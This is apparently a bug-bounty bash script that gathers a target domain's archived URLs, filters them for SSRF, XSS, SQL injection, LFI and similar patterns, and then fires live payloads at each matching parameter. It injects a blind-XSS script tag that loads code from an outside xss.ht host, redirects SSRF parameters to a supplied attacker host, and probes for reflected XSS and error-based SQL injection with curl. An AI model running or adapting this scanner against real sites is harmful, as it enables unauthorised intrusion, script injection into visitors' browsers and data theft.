#!/bin/bash

#Removing Initial Files
rm ~/scripts/target/wayback.txt ~/scripts/target/waybackurls.txt ~/scripts/target/gf.txt ~/scripts/target/extensions.txt ~/scripts/target/jsfiles.txt

# Gather WaybackUrls
echo "[+] Gathering WaybackUrls [+]"
echo $1 | waybackurls > ~/scripts/target/wayback.txt
echo $1 | gau >> ~/scripts/target/wayback.txt
sort -u ~/scripts/target/wayback.txt -o ~/scripts/target/wayback.txt
cat ~/scripts/target/wayback.txt | httpx -silent -follow-redirects > ~/scripts/target/waybackurls.txt

# Gather extension files from Waybackurls
echo "[+] Extracting Extension Files from WaybackUrls [+]"
cat ~/scripts/target/waybackurls.txt | egrep "asp$|aspx$|cer$|cfm$|cfml$|rb$|php$|php3$|php4$|php5$|jsp$|json$|apk$|ods$|xls$|xlsx$|xlsm$|bak$|cab$|cpl$|dmp$|drv$|tmp$|sys$|doc$|docx$|pdf$|txt$|wpd$|bat$|bin$" >> ~/scripts/target/extensions.txt
# Gather js files from Waybackurls
echo "[+] Extracting JS Files from WaybackUrls [+]"
cat ~/scripts/target/waybackurls.txt | egrep "js$" > ~/scripts/target/jsfiles.txt

# Find vulnerable endpoints
echo "[+] Find Vulnerable Endpoints via gf [+]"
# "[+] SSRF:" > ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf ssrf >> ~/scripts/target/gf.txt
# "[+] XSS:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf xss >> ~/scripts/target/gf.txt
# "[+] Open Redirect:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf redirect >> ~/scripts/target/gf.txt
# "[+] RCE:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf rce >> ~/scripts/target/gf.txt
# "[+] IDOR:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf idor >> ~/scripts/target/gf.txt
# "[+] SQLI:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf sqli >> ~/scripts/target/gf.txt
# "[+] LFI:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf lfi >> ~/scripts/target/gf.txt
# "[+] SSTI:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf ssti >> ~/scripts/target/gf.txt
# "[+] Debug_Logic:" >> ~/scripts/target/gf.txt
cat ~/scripts/target/waybackurls.txt | gf debug_logic >> ~/scripts/target/gf.txt

# Test for SSRF, Open Redirect via Burp Collaborator
echo "[+] Testing for SSRF & Open Redirect [+]"
cat ~/scripts/target/gf.txt | grep "=" | qsreplace http://$2 | while read host do; do curl --silent --insecure $host > /dev/null; done;

# Test for XSS and Blind XSS
echo "[+] Testing for Blind XSS [+]"
cat ~/scripts/target/gf.txt | grep "=" | qsreplace '"><script src=https://drag0n.xss.ht></script>' | while read host do; do curl --silent --insecure $host > /dev/null; done;

# Test for Reflected XSS
echo "[+] Testing for Reflected XSS [+]"
cat ~/scripts/target/waybackurls.txt | gf xss | grep "=" | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS HERE $host" ; done

# Test for SQLInjection Error Based
echo "[+] Testing for SQLI Error Based [+]"
cat ~/scripts/target/waybackurls.txt | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | egrep -qs "(mysql_fetch_array|SQL syntax|sql|SQL)" && echo "possible sql injection here $host" ; done

# Removing wayback txt file
echo "[-] Removing Draft Files [-]"
#rm ~/scripts/target/wayback.txt